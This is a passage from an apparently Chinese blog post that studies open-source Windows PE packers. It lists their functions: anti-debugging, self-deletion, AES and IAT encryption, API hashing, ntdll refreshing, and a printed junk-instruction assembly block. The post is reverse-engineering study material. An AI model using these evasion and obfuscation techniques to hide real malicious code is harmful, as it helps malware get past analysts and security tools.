class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1.</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))  如果SDK不支持的话 这样定义基址重定位表  </span><br><span class="hljs-number">2.</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> DLL_SAMPLE_API __declspec(dllexport) DLL导入类</span><br><span class="hljs-number">3.</span>打印日志位置，修改这个地方 LOG_PATH L<span class="hljs-string">&quot;D:/log.txt&quot;</span><br><span class="hljs-number">4.</span>生成自动删除文件名称<br><span class="hljs-number">5.</span>是否开始反调试代码 ANTI_REVERSE<br><span class="hljs-number">6.</span>默认打开日志  SUPPORT_LOG<br><span class="hljs-number">7.</span>自定义malloc模块   MemoryNode *node = (MemoryNode *)s_apier.VirtualAlloc(NULL, len + <span class="hljs-keyword">sizeof</span>(MemoryNode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<span class="hljs-comment">//这个是内存管理 这个 (MemoryNode *)s_apier是类</span><br><span class="hljs-number">8.</span>自定义mfree模块 调用了virtualfree<br><span class="hljs-number">9.</span>自定义pmemcpy<br><span class="hljs-number">10.</span>自定义ccpy sstrlen  memsetZero<br><span class="hljs-number">11.</span>getNtHeader<br><span class="hljs-number">12.</span>getImageSectionHeader<br><span class="hljs-number">13.</span>自定义 *int_to_str mprintf<br><span class="hljs-number">14.b</span>eingdebugged反调试<br><span class="hljs-number">15.</span>定义pUnhandledExceptionFilter 异处理异常筛选器<br><span class="hljs-number">16.</span>利用SetUnhandledExceptionFilter和pUnhandledExceptionFilter自定义一个异常处理反调试器isDebug1<br><span class="hljs-number">17.</span>_declspec (thread) LPCTSTR g_strTLS = L<span class="hljs-string">&quot;Stub TLS DATA&quot;</span>声明一个线程本地变量<br><span class="hljs-number">18.</span>创建TLS段  自然还是用到了C语言<br><span class="hljs-number">19.</span>照旧汇编获取kernel32,不过好像更高级了一点<br><span class="hljs-number">20.</span>GetGPAFunAddr函数定义 里面获取DOS头、NT头  获取导出表项 获取导出表详细信息 处理以函数名查找函数地址的请求，循环获取ENT中的函数名，并与传入值对比对，如能匹配上则在EAT中以指定序号作为索引，并取出其地址值。<br><span class="hljs-number">21.</span>初始化必要的函数信息 <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initFunction</span>()</span><br><span class="hljs-function">22.获取当前运行的进程地址 *<span class="hljs-title">getExePath</span>()</span><br><span class="hljs-function">23.生成临时bat文件字符串,使用mfree删除 *<span class="hljs-title">getTempDelBatFilePath</span>()</span><br><span class="hljs-function">24.自删除逻辑   <span class="hljs-title">deleteSelf</span>()</span><br><span class="hljs-function">25.自定义InitTLS表 (<span class="hljs-params">IMAGE_TLS_DIRECTORY中的地址就是虚拟地址直接用</span>)</span><br><span class="hljs-function">26.IAT重写 recoverIAT</span><br><span class="hljs-function">27.重定位OFFSET结构 typedef <span class="hljs-keyword">struct</span> _TYPEOFFSET</span><br><span class="hljs-function">28.修复原始重定位表 定位结构体(<span class="hljs-params">不一定需要</span>)  fixRelocation  还是调用了内存管理</span><br><span class="hljs-function">29.decompress 压缩  需要拷贝偏移</span><br><span class="hljs-function">30.isPasswordCorrect</span><br><span class="hljs-function">31.createWindowButton</span><br><span class="hljs-function">32.处理信息 WinProc</span><br><span class="hljs-function">33.checkPassword</span><br><span class="hljs-function">34.isTimeout</span><br><span class="hljs-function">35.主函数oid __<span class="hljs-title">declspec</span>(<span class="hljs-params">naked</span>)  <span class="hljs-title">pMain</span>()</span><br><span class="hljs-function">解压数据<span class="hljs-title">decompress</span>()</span><br><span class="hljs-function">修复重定向<span class="hljs-title">fixRelocation</span>()</span><br><span class="hljs-function">检测密码</span><br><span class="hljs-function">是否有限制时间</span><br><span class="hljs-function">恢复IAT</span><br><span class="hljs-function">看是否有TLS函数 如果有 则调用</span><br><span class="hljs-function">转交控制权</span><br></code></pre></td></tr></table></figure><h4 id="packer-exe"><a href="#packer-exe" class="headerlink" title="packer.exe"></a>packer.exe</h4><p>InputInfo.cpp : 实现文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.对话框<br>2.消息处理程序<br></code></pre></td></tr></table></figure><p>PackerDlg.cpp :对话框</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">用于应用程序“关于”菜单项的 <span class="hljs-built_in">CAboutDlg</span> 对话框<br>CPackerDlg 对话框<br>CPackerDlg 消息处理程序<br>当用户拖动最小化窗口时系统调用此函数取得光标<br></code></pre></td></tr></table></figure><p>pictureEx.cpp :界面装载图片</p><p>util.cpp</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">生成内存文件  不适用wi<span class="hljs-symbol">n32</span> CreateFileMapStruct<br>校验是否是<span class="hljs-number">32</span>位文件  isPEEXE<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><p>Task.cpp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>loading.cpp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Task::<span class="hljs-constructor">SetPEStruct(<span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">fileBuf</span>, PEstruct &amp;<span class="hljs-params">peStruct</span>)</span> 设置PE结构<br>Task::<span class="hljs-constructor">RVA2FA(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">lpFileBuffer</span>, <span class="hljs-params">int</span> RVA)</span> ROA转FOA<br>Task::<span class="hljs-constructor">GetExpVarAddr(<span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">strVarName</span>)</span> 获取扩展节地址？<br>Task::<span class="hljs-constructor">StoreSectionInfo(<span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">bufFile</span>, <span class="hljs-params">std</span>::<span class="hljs-params">vector</span>&lt;<span class="hljs-params">pSecInfo</span><span class="hljs-operator">*</span>&gt;&amp;<span class="hljs-params">vec</span>)</span> 储存节信息<br>Task::<span class="hljs-constructor">Align(DWORD <span class="hljs-params">dwAlign</span>, DWORD <span class="hljs-params">dwValue</span>)</span>  不知道干嘛的<br><span class="hljs-constructor">GetSecInfoByRVA(DWORD <span class="hljs-params">dwRVA</span>, DWORD <span class="hljs-params">dwAlign</span>, <span class="hljs-params">std</span>::<span class="hljs-params">vector</span>&lt;<span class="hljs-params">pSecInfo</span><span class="hljs-operator">*</span>&gt;&amp;<span class="hljs-params">vec</span>)</span> 获取SecInfo<br>Task::GetTargetImageSize 获取节大小<br>Task::GetPressSize 获取需要解压的大小<br>CopyPressData    赋值解压的数据<br>CompressData     压缩数据<br>Task::AddSec     用于AddTargetSection<br>Task::Start 创建FILEmap结构  引用<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Stub</span>.</span></span>dll 这只PE结构<br>Task::GetResRVA   用于修正资源表<br>Task::FixRsrc     修正资源表<br>GetSecInfoByName  通过名称获取节信息<br>SetPressDataDir   设置解压地址<br>ClearDataDir<br>fixStubRelocation 修复Stub重定位<br>Task::Pack      打包的主程序<br>SetDateAndPassword<br>SetGlobalVar<br>SaveFile<br>CopyToTargetFile<br>AddTargetSection<br>CopyToDestMemory   复制到目标内存<br></code></pre></td></tr></table></figure><p>内存管理是指软件运行时对计算机内存资源的分配和使用的技术。<em>其最主要的目的是如何高效，快速的分配，并且在适当的时候释放和回收内存资源。</em></p><h3 id="GuiShou-Pack-master"><a href="#GuiShou-Pack-master" class="headerlink" title="GuiShou_Pack-master"></a>GuiShou_Pack-master</h3><p>这个是分阶段写的 可能有助于理解</p><h4 id="阶段1–基础功能实现"><a href="#阶段1–基础功能实现" class="headerlink" title="阶段1–基础功能实现"></a>阶段1–基础功能实现</h4><p>main.cpp  —大部分函数调用的CPeFileoper.cpp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1.</span>CPeFileOper m_Pe 选择PE文件操作类对象<br><span class="hljs-number">2.</span><span class="hljs-built_in">char</span>* pTargetBuff = m_Pe.GetFileData 打开被加壳程序<br><span class="hljs-number">3.</span>m_Pe.<span class="hljs-constructor">LoadStub(&amp;<span class="hljs-params">stub</span>)</span>加载stub.dll<br><span class="hljs-number">4.</span>m_Pe.Encrypt加密被加壳程序的代码段<br><span class="hljs-number">5.</span>AddSection   GetSection  添加新区段<br><span class="hljs-number">6.</span>FixStubRelocation  GetSection  GetOptionHeader GetSection修复重定位<br><span class="hljs-number">7.</span><span class="hljs-constructor">GetOptionHeader(<span class="hljs-params">pTargetBuff</span>)</span>-&gt;AddressOfEntryPoint; 保存目标文件的OEP到stub的全局变量中<br><span class="hljs-number">8.</span>memcpy 将stub.dll的代码段复制到新加的GuiShou段中<br><span class="hljs-number">9.</span>修改OEP OEP=start(VA)-dll加载基址-段首RVA+新区段的段首RVA<br><span class="hljs-number">10.</span>去掉随机基址<br><span class="hljs-number">11.</span>SavePEFile保存被加壳的程序<br><br></code></pre></td></tr></table></figure><p>CPeFileoper.cpp</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pf">OpenPeFile 打开PE文件<br>GetFileData 获取文件内容和大小<br>GetD<span class="hljs-keyword">os</span>Header 获取D<span class="hljs-keyword">os</span>头<br>GetNtHeader 获取Nt头<br>GetFileHead 获取文件头<br>GetOptionHeader 获取可选头<br>GetLastSection 获取最后一个区段<br>AlignMent   计算对齐后的大小<br>GetSection  获取指定名字的区段头<br>AddSection  添加一个新的区段<br>SavePEFile  将文件保存到指定路径<br>LoadStub    加载stub.dll<br>Encrypt     加密目标程序的代码段<br>FixStubRelocation 修复stub.dll的重定位表<br></code></pre></td></tr></table></figure><p>stub.cpp</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Decrypt  解密代码段<br>GetApis  获取API函数地址 kernel获取LoadLibrary和VirtualProtect<br><span class="hljs-literal">Start</span>    dll的OEP获取函数API 解密代码段 跳转到原始的OEP<br></code></pre></td></tr></table></figure><h4 id="阶段2–增加弹框"><a href="#阶段2–增加弹框" class="headerlink" title="阶段2–增加弹框"></a>阶段2–增加弹框</h4><p>stub.cpp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">kernel32和user32获取各种相关api<br>pWcscmp 自己实现的一个字符串比较函数<br>AlertPasswordBox 密码弹框<br>WndPrco窗口回调函数<br></code></pre></td></tr></table></figure><p>main.cpp 不需要改</p><p>CPeFileoper.cpp  不需要改</p><h4 id="3-0-增加反调试"><a href="#3-0-增加反调试" class="headerlink" title="3.0 增加反调试"></a>3.0 增加反调试</h4><p>stub.cpp</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">AntiDebug  反调试 调用pfnFindWindowW<br>MixFun     混淆函数  汇编<br><span class="hljs-built_in">Start</span>()函数里多了<span class="hljs-built_in">AntiDebug</span>()<br></code></pre></td></tr></table></figure><p>main.cpp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">没变<br></code></pre></td></tr></table></figure><h4 id="4-0-增加AES加密"><a href="#4-0-增加AES加密" class="headerlink" title="4.0 增加AES加密"></a>4.0 增加AES加密</h4><p>stub文件夹多了个AES.cpp</p><p>stub.cpp</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">在<span class="hljs-built_in">decrypt</span>函数里面添加了aes解密的方法 InvCipher<br></code></pre></td></tr></table></figure><p>stub.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[<span class="hljs-number">16</span>] = &#123;&#125;;<span class="hljs-comment">//解密密钥</span><br></code></pre></td></tr></table></figure><p>CPeFileOper.cpp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">encrypt函数增加了aes加密<br>AES aes(key);<br>aes.<span class="hljs-constructor">Cipher(<span class="hljs-params">pTargetText</span>, <span class="hljs-params">dwTargetTextSize</span>)</span>;<br>CompressPE 压缩PE文件<br></code></pre></td></tr></table></figure><h4 id="5-0-增加Tls回调函数的调用"><a href="#5-0-增加Tls回调函数的调用" class="headerlink" title="5.0 增加Tls回调函数的调用"></a>5.0 增加Tls回调函数的调用</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//用于获取非rsrc/tls段的总大小 没写 <span class="hljs-operator">=</span> <span class="hljs-operator">=</span> <br></code></pre></td></tr></table></figure><h4 id="6-0-增加花指令"><a href="#6-0-增加花指令" class="headerlink" title="6.0 增加花指令"></a>6.0 增加花指令</h4><p>stub.dll</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++">FusedFunc<br>_asm<br>&#123;<br>jmp label1<br>label2 :<br>_emit <span class="hljs-number">0xeb</span>; <span class="hljs-comment">//跳到下面的call</span><br>_emit <span class="hljs-number">0x04</span>;<br>CALL DWORD PTR DS : [EAX + EBX * <span class="hljs-number">2</span> + <span class="hljs-number">0x123402EB</span>]; <span class="hljs-comment">//执行EB 02  也就是跳到下一句</span><br><br>  <span class="hljs-comment">//call Init;// 获取一些基本函数的地址</span><br><br>  <span class="hljs-comment">// call下一条,用于获得eip</span><br>_emit <span class="hljs-number">0xE8</span>;<br>_emit <span class="hljs-number">0x00</span>;<br>_emit <span class="hljs-number">0x00</span>;<br>_emit <span class="hljs-number">0x00</span>;<br>_emit <span class="hljs-number">0x00</span>;<br><span class="hljs-comment">//-------跳到下面的call</span><br>_emit <span class="hljs-number">0xEB</span>;<br>_emit <span class="hljs-number">0x0E</span>;<br><br><span class="hljs-comment">//-------花</span><br>PUSH <span class="hljs-number">0x0</span>;<br>PUSH <span class="hljs-number">0x0</span>;<br>MOV EAX, DWORD PTR FS : [<span class="hljs-number">0</span>];<br>PUSH EAX;<br><span class="hljs-comment">//-------花</span><br><br><br><span class="hljs-comment">// fused:</span><br><span class="hljs-comment">//作用push下一条语句的地址</span><br><span class="hljs-comment">//pop eax;</span><br><span class="hljs-comment">//add eax, 0x1b;</span><br><span class="hljs-comment">/*push eax;*/</span><br>CALL DWORD PTR DS : [EAX + EBX * <span class="hljs-number">2</span> + <span class="hljs-number">0x5019C083</span>];<br><br>push funcAddress; <span class="hljs-comment">//这里如果是参数传入的需要注意上面的add eax,??的??</span><br>retn;<br><br>jmp label3<br><br><span class="hljs-comment">// 花</span><br>_emit <span class="hljs-number">0xE8</span>;<br>_emit <span class="hljs-number">0x00</span>;<br>_emit <span class="hljs-number">0x00</span>;<br>_emit <span class="hljs-number">0x00</span>;<br>_emit <span class="hljs-number">0x00</span>;<br><span class="hljs-comment">// 花</span><br><br><br>label1:<br>jmp label2<br>label3 :<br>&#125;<br><br>callTls Tls回调函数<br>    pfnGetMoudleHandleA 获取当前程序的加载基址<br>    GetOptionHeader获取Tls表<br>壳程序<br></code></pre></td></tr></table></figure><p>这段花指令和壳程序我在各大代码看了不下7遍:joy:</p><h4 id="7-0-增加全部区段加密"><a href="#7-0-增加全部区段加密" class="headerlink" title="7.0 增加全部区段加密"></a>7.0 增加全部区段加密</h4><p>stub.dll</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">SetFileHeaderProtect</span>  设置属性可写<br>FixImportTable_Normal  修复IAT<br>RecoverDataDir        恢复数据目录表<br></code></pre></td></tr></table></figure><p>CPeFileOper.cpp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">encrypt函数加密所有区段<br><span class="hljs-comment">//修改属性为可写</span><br>DWORD dwOldAttr = <span class="hljs-number">0</span>;<br><span class="hljs-constructor">VirtualProtect(<span class="hljs-params">pTargetSection</span>, <span class="hljs-params">dwTargetSize</span>, PAGE_EXECUTE_READWRITE, &amp;<span class="hljs-params">dwOldAttr</span>)</span>;<br><span class="hljs-comment">//加密目标区段</span><br>aes.<span class="hljs-constructor">Cipher(<span class="hljs-params">pTargetSection</span>, <span class="hljs-params">dwTargetSize</span>)</span>;<br><span class="hljs-comment">//修改回原来的属性</span><br><span class="hljs-constructor">VirtualProtect(<span class="hljs-params">pTargetSection</span>, <span class="hljs-params">dwTargetSize</span>, <span class="hljs-params">dwOldAttr</span>, &amp;<span class="hljs-params">dwOldAttr</span>)</span>;<br><br>ClearDataDir清除数据目录表<br><br>删除了       CompressPE  压缩PE文件<br></code></pre></td></tr></table></figure><p>main.cpp</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">m_Pe.<span class="hljs-constructor">ClearDataDir(<span class="hljs-params">pTargetBuff</span>, <span class="hljs-params">stub</span>)</span>;<br></code></pre></td></tr></table></figure><h4 id="8-0-增加IAT加密-加花"><a href="#8-0-增加IAT加密-加花" class="headerlink" title="8.0 增加IAT加密 加花"></a>8.0 增加IAT加密 加花</h4><p>stub.cpp</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">EncryptFun</span>     在里面再写一个加密函数  异或加密<br>EncodeIAT加密IAT 调用EncryptFun加密impaddress<br></code></pre></td></tr></table></figure><p>CPeFileOper.cpp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">没变<br></code></pre></td></tr></table></figure><h4 id="8-0-增加IAT加密-未加花"><a href="#8-0-增加IAT加密-未加花" class="headerlink" title="8.0 增加IAT加密 未加花"></a>8.0 增加IAT加密 未加花</h4><p>对比加花 stub.cpp</p><table><thead><tr><th></th><th>加花</th><th>未加花</th></tr></thead><tbody><tr><td>在壳程序函数里</td><td>&#x2F;&#x2F;获取函数的API地址<br/>FusedFunc((DWORD)GetApis);<br/><br/>&#x2F;&#x2F;解密代码段<br/>FusedFunc((DWORD)Decrypt);<br/><br/>&#x2F;&#x2F;恢复数据目录表<br/>FusedFunc((DWORD)RecoverDataDir);<br/><br/>&#x2F;&#x2F;修复IAT<br/>FusedFunc((DWORD)FixImportTable_Normal);<br/><br/>&#x2F;&#x2F;反调试<br/>FusedFunc((DWORD)AntiDebug);<br/><br/>&#x2F;&#x2F;密码弹框<br/>FusedFunc((DWORD)AlertPasswordBox);<br/><br/>&#x2F;&#x2F;调用Tls回调函数<br/>FusedFunc((DWORD)CallTls);<br/><br/>&#x2F;&#x2F;加密IAT<br/>FusedFunc((DWORD)EncodeIAT);</td><td>不执行加壳函数</td></tr><tr><td></td><td></td><td></td></tr><tr><td>在start函数后</td><td>执行壳  FusedFunc((DWORD)AllFunc);</td><td></td></tr><tr><td></td><td></td><td>&#x2F;&#x2F;获取函数的API地址<br/>GetApis();<br/>&#x2F;&#x2F;解密代码段<br/>Decrypt();<br/>&#x2F;&#x2F;恢复数据目录表<br/>RecoverDataDir();<br/>&#x2F;&#x2F;修复IAT<br/>FixImportTable_Normal();<br/>&#x2F;&#x2F;反调试<br/>AntiDebug();<br/>&#x2F;&#x2F;密码弹框<br/>AlertPasswordBox();<br/>&#x2F;&#x2F;调用Tls回调函数<br/>CallTls();<br/>&#x2F;&#x2F;加密IAT<br/>EncodeIAT();</td></tr><tr><td>总</td><td>所有函数都调用了FusedFunc函数</td><td></td></tr><tr><td>FusedFunc函数</td><td>加花函数  需要自己再改改</td><td></td></tr></tbody></table><h4 id="9-完整体"><a href="#9-完整体" class="headerlink" title="9.完整体"></a>9.完整体</h4><p>stub.dll</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Decrypt  解密代码段<br>GetApis  获取API函数地址 kernel获取LoadLibrary和VirtualProtect<br>Start    dll的OEP获取函数API 解密代码段 跳转到原始的OEP<br>kernel32和user32获取各种相关api<br>pWcscmp 自己实现的一个字符串比较函数<br>AlertPasswordBox 密码弹框<br>WndPrco窗口回调函数<br>AntiDebug  反调试 调用pfnFindWindowW<br>MixFun     混淆函数  汇编<br>Start<span class="hljs-params">()</span>函数里多了AntiDebug<span class="hljs-params">()</span><br>unsigned char key[16] = &#123;&#125;;<span class="hljs-string">//</span>解密密钥<br><span class="hljs-string">//</span>用于获取非rsrc/tls段的总大小 没写 = =<br>callT<span class="hljs-keyword">ls</span> T<span class="hljs-keyword">ls</span>回调函数<br>    pfnGetMoudleHandleA 获取当前程序的加载基址<br>    GetOptionHeader获取T<span class="hljs-keyword">ls</span>表<br>增加花指令函数funcfund<br>SetFileHeaderProtect  设置属性可写<br>FixImportTable_Normal  修复IAT<br>RecoverDataDir        恢复数据目录表<br>EncryptFun     在里面再写一个加密函数  异或加密<br>EncodeIAT加密IAT 调用EncryptFun加密impaddress<br></code></pre></td></tr></table></figure><h3 id="AtomPepacker"><a href="#AtomPepacker" class="headerlink" title="AtomPepacker"></a>AtomPepacker</h3><h4 id="ArgsTest"><a href="#ArgsTest" class="headerlink" title="ArgsTest"></a>ArgsTest</h4><p>判断args输入命令</p><h4 id="hasher"><a href="#hasher" class="headerlink" title="hasher"></a>hasher</h4><p>应该是使用hash加密(散列替换)api函数字符串</p><p><img src="https://cd-1307445315.cos.ap-nanjing.pqcloud.com/CD%5C202210291240377.png" alt="image-20221029124004927"></p><h4 id="DLLPP64Stub"><a href="#DLLPP64Stub" class="headerlink" title="DLLPP64Stub"></a>DLLPP64Stub</h4><h5 id="General-c"><a href="#General-c" class="headerlink" title="General.c"></a>General.c</h5><p>就是自定义一些字符转换</p><h5 id="Utils-c"><a href="#Utils-c" class="headerlink" title="Utils.c"></a>Utils.c</h5><p>InitializeDirectNtCalls 初始化调用nt结构</p><p>GetDllFromKnownDlls     调用kernel.dll获取各类dll</p><p>hSection &#x3D; NtOpenSection 获取NT节句柄</p><p>RefreshNtdll需要时重新分配ntdll</p><p>GetModuleHandleH(自定义api哈希库)        从peb的ldr的pdte的InMemoryOrderModuleList.Flink  中枚举全部加载模块 然后获取模块句柄</p><p>LoadLibraryH(自定义api哈希库) 将指定的模块加载到调用进程的<a href="https://so.csdn.net/so/search?q=%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4&spm=1001.2101.3001.7020">地址空间</a>中。指定的模块可能会导致其他模块被加载。对于其他加载选项</p><p>无CRT导入</p><p>RtlInitUnicodeString  初始化设备名称指针。</p><p><strong>IoDeleteSymbolicLink</strong> 例程从系统中删除符号链接</p><p>IoDeleteDevice删除驱动</p><p><strong>Dbgprint</strong> extension 显示以前发送到<strong>dbgprint</strong>缓冲区的字符串。</p><h3 id="Shell-Protect-main-虚拟壳"><a href="#Shell-Protect-main-虚拟壳" class="headerlink" title="Shell_Protect-main(虚拟壳)"></a>Shell_Protect-main(虚拟壳)</h3><p>这个就有点难了 之后分析 别一口吃成胖子 先自己写个简单的加壳 然后改进 然后写这个虚拟化壳</p><p>就连压缩的代码都不一样 虚拟化实在太强了</p><p>compressiondata</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">在压缩之前要先进行Vmencode加密<br><span class="hljs-code">自定义加密次数 </span><br><span class="hljs-code">获取VM的其实地址</span><br><span class="hljs-code">线性反汇编来求大小</span><br><span class="hljs-code">添加一个区段给压缩后的数据使用</span><br><span class="hljs-code">调用VMP</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h4 id="反汇编引擎"><a href="#反汇编引擎" class="headerlink" title="反汇编引擎"></a>反汇编引擎</h4><p>用的是capstone</p><p>　 <a href="https://github.com/aquynh/capstone">capstone</a> 可以说是所有反汇编引擎中集大成者，对于它我要多费点口水，因为我对他是又爱又恨。capstone是基于LLVM框架中的MC组件部分移植过来，所以LLVM支持的CPU构架，capstone也都支持。<br>　　它支持的CPU构架有:</p><blockquote><p>Arm, Arm64 (Armv8), M68K, Mips, PowerPC, Sparc, SystemZ, XCore &amp; X86 (include X86_64)</p></blockquote><p>而且Capstone对X86构架的指令集支持是最全的，这一点是其他引擎都比不上的，其支持的X86扩展指令集有：</p><blockquote><p>3dnow, 3dnowa, x86_64, adx, aes, atom, avx, avx2, avx512cd, avx512er, avx512f, avx512pf, bmi, bmi2, fma, fma4, fsgsbase, lzcnt, mmx, sha, slm, sse, sse2, sse3, sse4.1, sse4.2, sse4a, ssse3, tbm, 